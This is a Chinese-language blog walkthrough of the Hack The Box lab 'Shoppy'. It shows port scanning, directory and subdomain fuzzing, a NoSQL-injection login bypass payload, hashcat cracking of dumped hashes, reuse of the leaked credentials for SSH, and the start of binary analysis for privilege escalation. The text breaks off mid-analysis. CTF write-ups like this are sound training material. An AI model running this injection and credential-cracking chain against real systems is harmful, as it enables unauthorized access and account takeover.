@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Shoppy - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Shoppy靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.180 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-12-21 20:59 EST Nmap scan rep">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shoppy - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Shoppy靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.180 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-12-21 20:59 EST Nmap scan rep">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/sMP6VyYQsVBPHnpOtxvXg5zHVcvJK_iZMEZiD6H4LF8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/WfyNY3no_puTV2jPd_All7D9oO3vFQTLcuiSjxjvrPw.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/WBwPDhoGXNQa1XI4aB8PUKBWqkZX0pQ3eKMMX4b-kgk.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/GcmtkFUlivIGLn3p3Hz6FnE-3XS_gxDcsZYK3YWu-Ps.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/aKaBFxvX_vfRmsqL9qxyRQSJzdsda4EwH-KzAaqr8P4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/MH3Lu48sq_naDTgKDLRD6PHVIVHo4XVsyMIKkrRhLRs.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/n0ZwZ9z_PivUPrbXRkrT2vLaxAwJ871NRnTBc5ns06Y.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/8bG08PtQP0JeDHKrF9xon1QswWhY2CQlAiZuN0OKAzA.png">
+<meta property="article:published_time" content="2022-09-17T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-17T02:28:37.783Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/sMP6VyYQsVBPHnpOtxvXg5zHVcvJK_iZMEZiD6H4LF8.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Shoppy - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Shoppy - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-09-17T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-09-17
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Shoppy"><span class="post-toc-text">Hackthebox - Shoppy</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#User"><span class="post-toc-text">User</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Docker-越权"><span class="post-toc-text">Docker 越权</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Easy/Hackthebox-Shoppy"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Shoppy - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-09-17 19:38:36" datetime="2022-09-17T11:38:36.000Z"  itemprop="datePublished">2022-09-17</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Shoppy"><a href="#Hackthebox-Shoppy" class="headerlink" title="Hackthebox - Shoppy"></a>Hackthebox - Shoppy</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/sMP6VyYQsVBPHnpOtxvXg5zHVcvJK_iZMEZiD6H4LF8.png" class title="image">
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.180
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 20:59 EST
+Nmap scan report for 10.10.11.180
+Host is up (0.25s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
+|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
+|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
+80/tcp   open  http     nginx 1.23.1
+|_http-title: Did not follow redirect to http://shoppy.htb
+|_http-server-header: nginx/1.23.1
+9093/tcp open  copycat?
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/plain; version=0.0.4; charset=utf-8
+|     Date: Thu, 22 Dec 2022 01:59:42 GMT
+|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
+|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
+|     go_gc_cycles_automatic_gc_cycles_total 2612
+|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
+|     TYPE go_gc_cycles_forced_gc_cycles_total counter
+|     go_gc_cycles_forced_gc_cycles_total 0
+|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
+|     TYPE go_gc_cycles_total_gc_cycles_total counter
+|     go_gc_cycles_total_gc_cycles_total 2612
+|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
+|     TYPE go_gc_duration_seconds summary
+|     go_gc_duration_seconds{quantile=&quot;0&quot;} 4.218e-05
+|     go_gc_duration_seconds{quantile=&quot;0.25&quot;} 0.000107572
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/plain; version=0.0.4; charset=utf-8
+|     Date: Thu, 22 Dec 2022 01:59:43 GMT
+|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
+|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
+|     go_gc_cycles_automatic_gc_cycles_total 2612
+|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
+|     TYPE go_gc_cycles_forced_gc_cycles_total counter
+|     go_gc_cycles_forced_gc_cycles_total 0
+|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
+|     TYPE go_gc_cycles_total_gc_cycles_total counter
+|     go_gc_cycles_total_gc_cycles_total 2612
+|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
+|     TYPE go_gc_duration_seconds summary
+|     go_gc_duration_seconds{quantile=&quot;0&quot;} 4.218e-05
+|_    go_gc_duration_seconds{quantile=&quot;0.25&quot;} 0.000107572
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9093-TCP:V=7.93%I=7%D=12/21%Time=63A3BA0E%P=x86_64-pc-linux-gnu%r(G
+SF:enericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
+SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
+SF:x20Request&quot;)%r(GetRequest,2F0E,&quot;HTTP/1\.0\x20200\x20OK\r\nContent-Type:
+SF:\x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Thu,\x
+SF:2022\x20Dec\x202022\x2001:59:42\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycles
+SF:_automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\
+SF:x20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycles
+SF:_automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles
+SF:_total\x202612\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Cou
+SF:nt\x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applica
+SF:tion\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo
+SF:_gc_cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total
+SF:_gc_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n
+SF:#\x20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycle
+SF:s_total_gc_cycles_total\x202612\n#\x20HELP\x20go_gc_duration_seconds\x2
+SF:0A\x20summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20col
+SF:lection\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo
+SF:_gc_duration_seconds{quantile=\&quot;0\&quot;}\x204\.218e-05\ngo_gc_duration_seco
+SF:nds{quantile=\&quot;0\.25\&quot;}\x200\.000107572\ngo_&quot;)%r(HTTPOptions,2A5A,&quot;HTTP
+SF:/1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4;\
+SF:x20charset=utf-8\r\nDate:\x20Thu,\x2022\x20Dec\x202022\x2001:59:43\x20G
+SF:MT\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Count\
+SF:x20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20r
+SF:untime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20counte
+SF:r\ngo_gc_cycles_automatic_gc_cycles_total\x202612\n#\x20HELP\x20go_gc_c
+SF:ycles_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycle
+SF:s\x20forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_fo
+SF:rced_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x2
+SF:00\n#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20a
+SF:ll\x20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_c
+SF:ycles_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x202612\n#\x
+SF:20HELP\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\
+SF:x20duration\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go
+SF:_gc_duration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\&quot;0\&quot;}
+SF:\x204\.218e-05\ngo_gc_duration_seconds{quantile=\&quot;0\.25\&quot;}\x200\.000107
+SF:572\ngo_&quot;);
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=12/21%OT=22%CT=1%CU=41733%PV=Y%DS=2%DC=T%G=Y%TM=63A3BA
+OS:84%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
+OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
+OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
+OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT       ADDRESS
+1   276.37 ms 10.10.14.1
+2   276.85 ms 10.10.11.180
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 150.68 seconds
+</code></pre>
+<p>这里一看就需要做 hosts 解析，我们加进去</p>
+<pre><code class="bash">echo 10.10.11.180 shoppy.htb &gt;&gt; /etc/hosts
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/WfyNY3no_puTV2jPd_All7D9oO3vFQTLcuiSjxjvrPw.png" class title="image">
+
+<p>似乎是一个什么倒计时，倒计时到了就会推出一个什么版本，咱们做个信息收集先</p>
+<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ffuf -u &quot;http://shoppy.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://shoppy.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 291ms]
+admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 314ms]
+images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 315ms]
+js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 322ms]
+login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 339ms]
+assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 278ms]
+Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 295ms]
+Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 295ms]
+fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 277ms]
+ADMIN                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 277ms]
+exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 279ms]
+                        [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 279ms]
+LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 288ms]
+:: Progress: [30000/30000] :: Job [1/1] :: 23 req/sec :: Duration: [0:03:43] :: Errors: 2 ::
+</code></pre>
+<p>经过测试，只有 Login 可以访问，是一个登陆页面</p>
+<img src="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/WBwPDhoGXNQa1XI4aB8PUKBWqkZX0pQ3eKMMX4b-kgk.png" class title="image">
+
+<p>这里可以使用万能密码 admin’||’’&#x3D;&#x3D;&#x3D;’ 进行登陆</p>
+<img src="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/GcmtkFUlivIGLn3p3Hz6FnE-3XS_gxDcsZYK3YWu-Ps.png" class title="image">
+
+<p>登入后是一个价格表，右上角有个查询用户的功能</p>
+<p>我们查询万能密码后，会得到两个账户</p>
+<pre><code class="bash">{&quot;_id&quot;:&quot;62db0e93d6d6a999a66ee67a&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;23c6877d9e2b564ef8b32c3a23de27b2&quot;}
+{&quot;_id&quot;:&quot;62db0e93d6d6a999a66ee67b&quot;,&quot;username&quot;:&quot;josh&quot;,&quot;password&quot;:&quot;6ebcea65320589ca4f2f1ce039975995&quot;}
+</code></pre>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>把 password 提取出来，丢 hashcat 跑一下</p>
+<pre><code class="bash">echo &quot;6ebcea65320589ca4f2f1ce039975995&quot; &gt; hash
+
+┌──(root㉿kali)-[~/Desktop]
+└─# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt       
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-12th Gen Intel(R) Core(TM) i5-12400F, 1438/2940 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
+
+Started: Wed Dec 21 22:07:00 2022
+Stopped: Wed Dec 21 22:07:00 2022
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~/Desktop]
+└─# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show
+6ebcea65320589ca4f2f1ce039975995:remembermethisway
+</code></pre>
+<p>这边只有 josh 的账户爆出来了，admin 的无法爆出来</p>
+<p>使用这个密码进行 ssh 登陆，是失败的，那就证明还有我们没有发现的地方，这里我们尝试爆破子域名</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ffuf -H &quot;Host: FUZZ.shoppy.htb&quot; -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.180 -fs 169
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.180
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+ :: Header           : Host: FUZZ.shoppy.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 169
+________________________________________________
+
+mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 266ms]
+:: Progress: [100000/100000] :: Job [1/1] :: 150 req/sec :: Duration: [0:11:17] :: Errors: 0 ::
+</code></pre>
+<p>加入到 hosts 解析中</p>
+<pre><code class="bash">echo 10.10.11.180 mattermost.shoppy.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>接着去访问一下</p>
+<img src="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/aKaBFxvX_vfRmsqL9qxyRQSJzdsda4EwH-KzAaqr8P4.png" class title="image">
+
+<p>是一个登陆界面，用我们刚才破解出来的账号密码去进行登陆</p>
+<pre><code class="bash">username = josh
+password = remembermethisway
+</code></pre>
+<img src="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/MH3Lu48sq_naDTgKDLRD6PHVIVHo4XVsyMIKkrRhLRs.png" class title="image">
+
+<p>登陆成功，到处看一下，做一下信息收集</p>
+<img src="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/n0ZwZ9z_PivUPrbXRkrT2vLaxAwJ871NRnTBc5ns06Y.png" class title="image">
+
+<p>在 Deploy Machine 中，我们看到 jaeger 发布了一个账号密码</p>
+<pre><code class="bash">username = jaeger
+password = Sh0ppyBest@pp!
+</code></pre>
+<p>这似乎是一个用 docker 部署的东西，那应该可以使用 ssh 进行登陆</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ssh jaeger@10.10.11.180 
+jaeger@10.10.11.180&#39;s password: 
+Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+jaeger@shoppy:~$ whoami&amp;&amp;id
+jaeger
+uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
+</code></pre>
+<p>登陆成功</p>
+<pre><code class="bash">jaeger@shoppy:~$ cat user.txt 
+ff6024ae7ef749b44ac3fbc6ce9df1ce
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><pre><code class="bash">jaeger@shoppy:~$ sudo -l
+[sudo] password for jaeger: 
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+</code></pre>
+<p>这里发现一个奇怪的文件，我们想办法给他搞出来在本地分析一下</p>
+<pre><code class="bash">cd /home/deploy/
+python3 -m http.server 1234
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# wget http://10.10.11.180:1234/password-manager                                  
+--2022-12-22 01:34:58--  http://10.10.11.180:1234/password-manager
+正在连接 10.10.11.180:1234... 已连接。
+已发出 HTTP 请求，正在等待回应... 200 OK
+长度：18440 (18K) [application/octet-stream]
+正在保存至: “password-manager”
+
+password-manager                                     100%[=====================================================================================================================&gt;]  18.01K  63.9KB/s  用时 0.3s    
+
+2022-12-22 01:34:59 (63.9 KB/s) - 已保存 “password-manager” [18440/18440])
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# file password-manager                                                                                    
+password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped
+</code></pre>
+<p>这是一个 64 位的可执行文件</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# r2 password-manager 
+Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
+[0x00001120]&gt;
+</code></pre>
+<p>使用 r2 分析一下</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# r2 password-manager 
+Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
+[0x00001120]&gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Finding and parsing C++ vtables (avrr)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information (aanr)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x00001120]&gt; afl
+0x00001120    1 43           entry0
+0x00001150    4 41   -&gt; 34   sym.deregister_tm_clones
+0x00001180    4 57   -&gt; 51   sym.register_tm_clones
+0x000011c0    5 57   -&gt; 50   sym.__do_global_dtors_aux
+0x00001110    1 6            sym.imp.__cxa_finalize
+0x00001200    1 5            entry.init0
